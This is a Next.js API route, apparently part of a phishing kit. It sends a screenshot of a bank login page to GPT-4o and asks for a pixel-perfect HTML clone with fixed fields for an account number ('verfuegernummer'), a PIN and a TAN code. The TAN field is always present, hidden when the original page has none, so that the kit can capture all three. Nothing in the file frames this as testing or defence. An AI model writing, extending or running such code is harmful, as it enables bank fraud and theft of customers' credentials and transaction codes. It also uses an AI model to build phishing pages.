import { NextResponse } from "next/server";
import OpenAI from "openai";

export async function POST(req: Request) {
  try {
    if (!process.env.OPENAI_API_KEY) {
      console.error("[AI Design] OpenAI API key is missing in environment variables.");
      return NextResponse.json(
        { error: "Yapay zeka motoru başlatılamadı: OpenAI API anahtarı (OPENAI_API_KEY) bulunamadı. Lütfen projenin .env.local dosyasında tanımlı olduğundan ve Vercel (veya sunucu) ortam değişkenleri (Environment Variables) sekmesine eklendiğinden emin olun." },
        { status: 500 }
      );
    }

    const openai = new OpenAI({
      apiKey: process.env.OPENAI_API_KEY,
    });

    const { imageUrl } = await req.json();

    if (!imageUrl) {
      return NextResponse.json({ error: "Resim URL'si gerekli" }, { status: 400 });
    }

    const prompt = `
You are an expert frontend developer and CSS architect. Analyze the provided bank login page image.
Instead of returning a rigid JSON config, you must write a complete, pixel-perfect HTML template using Tailwind CSS utility classes and inline styles to perfectly clone the reference image.
We will use this HTML to render a dynamic React component.

Requirements for the HTML:
1. The wrapper should be a <div> that represents the entire viewport (e.g. min-h-screen).
2. It MUST contain a <form> element.
3. Inside the form, you MUST include the following exact input tags so our React system can bind to them:
   - <input name="verfuegernummer" /> (for the username, account number, or client number)
   - <input name="pin" type="password" /> (for the password or PIN)
   - <input name="tacCode" /> (if there is a 3rd input in the image. If not, include it anyway but add style="display:none;" so our system can still bind it).
   - <button type="submit">The button text</button>
4. Extract the exact text, colors (using hex codes in Tailwind classes like bg-[#0051a5] or inline styles), border-radiuses, spacing, layout (e.g., split screen, centered box, full width header), and typography you see in the image.
5. If there is a logo, use a placeholder <img> tag or just a stylized <div> with the bank's name. Our system will dynamically inject the logo later if needed.
6. Do NOT include <html>, <head>, or <body> tags. Start directly with the main container <div>.
7. DO NOT use any markdown formatting (like \`\`\`json). Return ONLY the raw JSON object.

The JSON MUST match this exact schema (we will mostly rely on customHtml, but fill the others with dummy/default data to satisfy TypeScript):
{
  "customHtml": "your_raw_html_string_here (MAKE IT MINIFIED OR SINGLE LINE TO AVOID JSON ESCAPING ISSUES IF POSSIBLE, ESCAPE QUOTES PROPERLY)",
  "layout": "centered",
  "blocks": ["form"],
  "background": { "type": "color", "value": "#ffffff" },
  "header": { "show": false, "backgroundColor": "#fff", "height": "0", "logoAlignment": "center", "padding": "0" },
  "formBox": { "backgroundColor": "#fff", "textColor": "#000", "borderRadius": "0", "boxShadow": "none", "padding": "0", "width": "100%", "alignment": "center" },
  "button": { "backgroundColor": "#000", "hoverColor": "#000", "textColor": "#fff", "borderRadius": "0", "padding": "0", "fontWeight": "normal" },
  "typography": { "fontFamily": "sans-serif", "headerColor": "#000", "bodyColor": "#000", "linkColor": "#000" },
  "texts": { "title": "Login", "subtitle": "", "footerLinks": [] }
}
    `;

    const response = await openai.chat.completions.create({
      model: "gpt-4o",
      messages: [
        {
          role: "user",
          content: [
            { type: "text", text: prompt },
            {
              type: "image_url",
              image_url: {
                url: imageUrl,
              },
            },
          ],
        },
      ],
      max_tokens: 2500,
    });

    const aiText = response.choices[0].message.content || "";
    // Clean potential markdown formatting
    const jsonStr = aiText.replace(/```json/g, "").replace(/```/g, "").trim();
    
    const designData = JSON.parse(jsonStr);

    return NextResponse.json({ design: designData });
  } catch (error: any) {
    console.error("AI Design Analysis Error:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
